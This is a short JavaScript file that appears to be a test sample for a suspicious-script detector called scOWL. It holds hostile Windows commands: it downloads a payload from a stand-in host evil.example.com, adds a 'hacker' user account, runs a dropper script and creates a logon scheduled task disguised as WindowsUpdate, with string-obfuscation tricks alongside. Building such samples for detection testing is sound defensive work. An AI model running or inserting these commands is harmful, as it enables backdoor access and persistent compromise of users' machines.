// Suspicious JS script - scOWL test sample
var url = "http://evil.example.com/payload.exe";
var ip = "192.168.1.100";

var xhr = new XMLHttpRequest();
xhr.open("GET", url, false);
xhr.send();

var shell = new ActiveXObject("WScript.Shell");
shell.Run("cmd /c net user hacker P@ssw0rd /add");

var encoded = "cGF5bG9hZA==";
var decoded = unescape("%70%61%79%6C%6F%61%64");
var chars = String.fromCharCode(112, 97, 121, 108, 111, 97, 100);
var parts = ["pay", "load"].join('');

shell.Run("cscript C:\\Temp\\dropper.vbs");
CreateObject("WScript.Shell").Run("cmd /c schtasks /create /tn WindowsUpdate /tr C:\\Temp\\svc.exe /sc onlogon");